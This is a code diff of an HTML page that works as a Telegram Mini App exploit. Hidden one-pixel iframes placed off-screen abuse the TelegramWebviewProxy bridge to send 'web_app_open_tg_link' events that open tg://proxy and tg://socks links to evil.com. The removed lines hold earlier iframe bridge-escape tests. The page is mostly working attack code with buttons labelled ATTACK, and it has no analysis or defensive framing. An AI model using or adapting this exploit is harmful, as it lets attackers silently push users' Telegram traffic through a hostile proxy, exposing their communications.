@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>Origin Bypass v2</title>
+<head><meta charset="utf-8"><title>FINAL: iframe → proxy exploit</title>
 <style>
 body{background:#0a0a0a;color:#ddd;font:12px monospace;margin:0;padding:10px}
 h2{color:#f44;margin:0 0 4px 0}
@@ -9,124 +9,57 @@ button{display:block;width:100%;margin:3px 0;padding:8px;background:#222;color:#
 button.fire{background:#4a0000;border-color:#f44;font-size:13px}
 .green{color:#0f0}.red{color:#f44}.yellow{color:#ff0}
 </style></head><body>
-<h2>Origin Bypass v2 — iframe exploit chain</h2>
-<div id="log"></div>
+<h2>FINAL: Invisible iframe → tg://proxy</h2>
+<div id="log">Init...</div>
 <div id="btns"></div>
 
 <script>
 const L=(s,c)=>{const e=document.getElementById('log');e.innerHTML+=`<span class="${c||''}">${s}</span>\n`;e.scrollTop=e.scrollHeight;};
-L('Origin: '+location.origin,'yellow');
-L('Bridge: '+(!!(window.TelegramWebviewProxy?.postEvent) ? 'YES' : 'NO'),'green');
 
-// Helper: create invisible iframe, inject exploit JS
-function iframeExploit(src, jsCode) {
-  L(`--- iframe: ${src} ---`,'yellow');
-  const iframe = document.createElement('iframe');
-  iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px';
-  iframe.src = src;
-  iframe.onload = () => {
-    try {
-      const win = iframe.contentWindow;
-      const doc = win.document;
-      doc.open();
-      doc.write(`<script>
-        var L2 = function(s) { 
-          try { document.body.innerHTML += s + '<br>'; } catch(e) {} 
-        };
-        L2('ORIGIN: ' + location.origin);
-        var proxy = window.TelegramWebviewProxy || window.parent?.TelegramWebviewProxy;
-        var hasBridge = !!(proxy && proxy.postEvent);
-        L2('BRIDGE: ' + (hasBridge ? 'YES!!!' : 'no'));
-        if (hasBridge) {
-          proxy.postEvent('web_app_open_tg_link', {path_full: '/durov'});
-          L2('SENT from iframe!');
-        }
-        // Also try postMessage to parent
+L(`Origin: ${location.origin}`,'yellow');
+L(`Bridge: ${!!(window.TelegramWebviewProxy?.postEvent) ? 'YES':'NO'}`,'green');
+
+function proxyAttack(method) {
+  L(`\n--- ${method} ---`,'red');
+
+  const payloads = [
+    ['/proxy/?server=evil.com&port=443&secret=00aabbcc', 'tg://proxy (MTProto)'],
+    ['/socks/?server=evil.com&port=1080', 'tg://socks (SOCKS5)'],
+    ['/durov', 'tg://resolve?domain=durov (control)'],
+  ];
+
+  for (const [path, desc] of payloads) {
+    const iframe = document.createElement('iframe');
+
+    if (method === 'srcdoc') {
+      iframe.srcdoc = `<script>
+        var p = window.TelegramWebviewProxy || window.parent.TelegramWebviewProxy;
+        if (p) p.postEvent('web_app_open_tg_link', {path_full: '${path}'});
+      <\\/script>`;
+    } else if (method === 'blank') {
+      iframe.src = 'about:blank';
+      iframe.onload = () => {
         try {
-          window.parent.postMessage(JSON.stringify(['web_app_open_tg_link', {path_full: '/durov'}]), '*');
-          L2('postMessage sent');
-        } catch(e) { L2('postMessage err: '+e.message); }
-      <\\/script>`);
-      doc.close();
-    } catch(e) {
-      L('ERROR: '+e.message,'red');
+          const w = iframe.contentWindow;
+          w.eval(`(function(){
+            var p = window.TelegramWebviewProxy || window.parent.TelegramWebviewProxy;
+            if (p) p.postEvent('web_app_open_tg_link', {path_full: '${path}'});
+          })()`);
+        } catch(e) { L(`  eval ERROR: ${e.message}`,'red'); }
+      };
     }
-  };
-  document.body.appendChild(iframe);
+
+    iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px';
+    document.body.appendChild(iframe);
+    L(`  TX from iframe: ${desc}`);
+  }
+
+  L('  All 3 sent. Check Telegram Desktop.','green');
 }
 
-// Exploit 1: about:blank iframe (confirmed working)
-function testBlank() {
-  L('Test: about:blank iframe','yellow');
-  iframeExploit('about:blank');
-}
-
-// Exploit 2: srcdoc iframe (no network request!)
-function testSrcDoc() {
-  L('Test: srcdoc iframe (same origin)','yellow');
-  const iframe = document.createElement('iframe');
-  iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px';
-  iframe.srcdoc = '<script>document.body.innerHTML="srcdoc origin:"+location.origin+" bridge:"+!!(window.TelegramWebviewProxy?.postEvent);<\/script>';
-  iframe.onload = () => {
-    L('srcdoc origin: '+iframe.contentWindow.location.origin);
-    L('srcdoc bridge: '+(!!(iframe.contentWindow.TelegramWebviewProxy?.postEvent)?'YES':'no'));
-  };
-  document.body.appendChild(iframe);
-}
-
-// Exploit 3: sandbox iframe — can we escape?
-function testSandbox() {
-  L('Test: sandboxed iframe','yellow');
-  const iframe = document.createElement('iframe');
-  iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px';
-  iframe.sandbox = 'allow-scripts';
-  iframe.srcdoc = '<script>document.body.innerHTML="SANDBOX origin:"+location.origin+" bridge:"+!!(window.TelegramWebviewProxy?.postEvent);<\/script>';
-  iframe.onload = () => {
-    try {
-      L('sandbox origin: '+iframe.contentWindow.location.origin);
-      L('sandbox bridge: '+(!!(iframe.contentWindow.TelegramWebviewProxy?.postEvent)?'YES':'no'));
-    } catch(e) {
-      L('sandbox access blocked: '+e.message,'red');
-    }
-  };
-  document.body.appendChild(iframe);
-}
-
-// Exploit 4: Can we access Telegram WebApp SDK from iframe?
-function testSdkFromIframe() {
-  L('Test: WebApp SDK from about:blank iframe','yellow');
-  const iframe = document.createElement('iframe');
-  iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px';
-  iframe.src = 'about:blank';
-  iframe.onload = () => {
-    try {
-      const win = iframe.contentWindow;
-      const doc = win.document;
-      doc.open();
-      doc.write(`<script src="https://telegram.org/js/telegram-web-app.js"><\\/script><script>
-        var tg = window.Telegram || window.parent.Telegram;
-        document.body.innerHTML = "SDK: " + (tg ? "accessible" : "no");
-        if (tg && tg.WebApp && tg.WebApp.ready) {
-          document.body.innerHTML += " WebApp v" + tg.WebApp.version;
-        }
-      <\\/script>`);
-      doc.close();
-      setTimeout(() => {
-        L('iframe SDK: '+win.document.body.textContent);
-      }, 2000);
-    } catch(e) {
-      L('ERROR: '+e.message,'red');
-    }
-  };
-  document.body.appendChild(iframe);
-}
-
-L('Ready.','green');
 document.getElementById('btns').innerHTML = `
-  <button class="fire" onclick="testBlank()">about:blank iframe → send cmd (confirmed)</button>
-  <button class="fire" onclick="testSrcDoc()">srcdoc iframe → bridge access?</button>
-  <button class="fire" onclick="testSandbox()">sandbox iframe → bridge access?</button>
-  <button onclick="testSdkFromIframe()">WebApp SDK from iframe?</button>
+  <button class="fire" onclick="proxyAttack('srcdoc')">ATTACK: srcdoc iframe → proxy/socks/durov</button>
+  <button class="fire" onclick="proxyAttack('blank')">ATTACK: blank iframe → proxy/socks/durov</button>
   <button onclick="location.reload()">RELOAD</button>
 `;
 </script>
